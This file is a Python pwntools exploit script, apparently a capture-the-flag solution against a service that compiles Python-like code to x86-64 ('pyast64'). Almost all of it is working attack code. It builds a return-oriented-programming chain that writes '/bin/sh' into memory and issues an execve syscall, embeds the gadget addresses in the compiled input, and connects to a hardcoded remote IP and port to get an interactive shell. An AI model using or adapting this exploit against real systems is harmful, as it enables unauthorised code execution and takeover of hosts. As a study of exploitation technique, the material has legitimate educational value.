#!/usr/bin/env python
"""Exploit script template."""
import subprocess
import sys
import psutil

from struct import pack

from pwn import *

context.log_level = 'debug'
#context.terminal = ['tmux', 'splitw', '-p', '75']
#context.aslr = False

BINARY = './'
GDB_BINARY = '/usr/bin/python3'
HOST = '118.195.199.18'
PORT = 40404

PWN_HOST = 'localhost'

GDB_COMMANDS = ['b *0x7ffff7ff405d']
GDB_COMMANDS = ['b *0x00007ffff7ff4000']


def get_ropchain_addresses():

    p = lambda x : x

    IMAGE_BASE_0 = 0x0000000000400000
    rebase_0 = lambda x : p(x + IMAGE_BASE_0)

    rop = []

    # We use the following gadgets:
    # 0x0000000000421095: pop rax; ret;
    # 0x0000000000623891: imul rax, rsi; ret;
    # 0x000000000042159a: pop rsi; ret;
    # 0x00000000005f2884: add rax, rbx; pop rbx; pop rbp; pop r12; ret;
    # 0x0000000000421393: pop rbx; ret;
    # 0x00000000004d3ee1: ret;
    # 0x00000000004a2fce: mov qword ptr [rsi], rax; ret;

    rop.append(rebase_0(0x0000000000021095)) # 0x0000000000421095: pop rax; ret;
    rop.append(p(0x0068732f)) # '/sh\0'
    rop.append(rebase_0(0x000000000002159a)) # 0x000000000042159a: pop rsi; ret;
    rop.append(p(0x10000))
    rop.append(rebase_0(0x0000000000223891)) # 0x0000000000623891: imul rax, rsi; ret;
    rop.append(rebase_0(0x0000000000223891)) # 0x0000000000623891: imul rax, rsi; ret;

    rop.append(rebase_0(0x0000000000021393)) # 0x0000000000421393: pop rbx; ret;
    rop.append(p(0x6e69622f)) # '/bin'

    # Setting rax to '/bin/sh\0'
    rop.append(rebase_0(0x00000000001f2884)) # 0x00000000005f2884: add rax, rbx; pop rbx; pop rbp; pop r12; ret;
    rop.append(p(0x00000000004d3ee1))
    rop.append(p(0x0000000000adbeef))
    rop.append(p(0x0000000000adbeef))

    # Setting rsi to buffer address
    rop.append(rebase_0(0x000000000002159a)) # 0x000000000042159a: pop rsi; ret;
    rop.append(rebase_0(0x00000000005b4ea0))

    # Writing '/bin/sh\0' to the buffer
    rop.append(rebase_0(0x00000000000a2fce)) # 0x00000000004a2fce: mov qword ptr [rsi], rax; ret;

    # The following part is auto-generated from ropper
    rop.append(rebase_0(0x0000000000021872)) # 0x0000000000421872: pop rdi; ret;
    rop.append(rebase_0(0x00000000005b4ea0))
    rop.append(rebase_0(0x000000000002159a)) # 0x000000000042159a: pop rsi; ret;
    rop.append(rebase_0(0x00000000005b4ea8))
    rop.append(rebase_0(0x00000000000026c1)) # 0x00000000004026c1: pop rdx; ret;
    rop.append(rebase_0(0x00000000005b4ea8))
    rop.append(rebase_0(0x0000000000021095)) # 0x0000000000421095: pop rax; ret;
    rop.append(p(0x000000000000003b))
    rop.append(rebase_0(0x00000000000ff807)) # 0x00000000004ff807: syscall;

    return rop


code = '\n'.join([f'exit({hex(a)})\n' for a in [0x44444444]*5])  # Mainly for debugging

code += '\n'.join([f'exit({hex(a)})' for a in get_ropchain_addresses()[::-1]])

code += """
def my_func():
    putc(0x46)

return 0
"""



def exploit(p, mode):
    """Exploit goes here."""
    p.sendlineafter('.\n', code)

    #pause()
    p.sendline('EOF')

    if mode == "debug":
        attach_gdb()

    p.interactive()


def attach_gdb():
    procs = [p for p in psutil.process_iter() if p.name() == 'python3'
             and 'pyast64.py' in  p.cmdline()]
    assert len(procs) == 1

    pid = procs[0].pid

    gdb_cmd = [
        'tmux',
        'split-window',
        '-p',
        '75',
        'sudo',
        'gdb',
        '-ex',
        f'attach {pid}',
    ]

    for cmd in GDB_COMMANDS:
        gdb_cmd.append('-ex')
        gdb_cmd.append(cmd)

    gdb_cmd.append(GDB_BINARY)

    subprocess.Popen(gdb_cmd)


def main():
    """Does general setup and calls exploit."""
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <mode>')
        sys.exit(0)

    try:
        context.binary = ELF(BINARY)
    except IOError:
        print(f'Failed to load binary ({BINARY})')

    mode = sys.argv[1]

    #if mode == 'local':
    #    p = process(BINARY, env=env)
    #elif mode == 'debug':
    #    p = gdb.debug(args=BINARY, gdbscript='\n'.join(GDB_COMMANDS), env=env)

    if mode == 'local':
        p = remote(PWN_HOST, PORT)
    elif mode == 'debug':
        p = remote(PWN_HOST, PORT)

    elif mode == 'remote':
        p = remote(HOST, PORT)
    else:
        print('Invalid mode')
        sys.exit(1)

    exploit(p, mode)

if __name__ == '__main__':

    main()
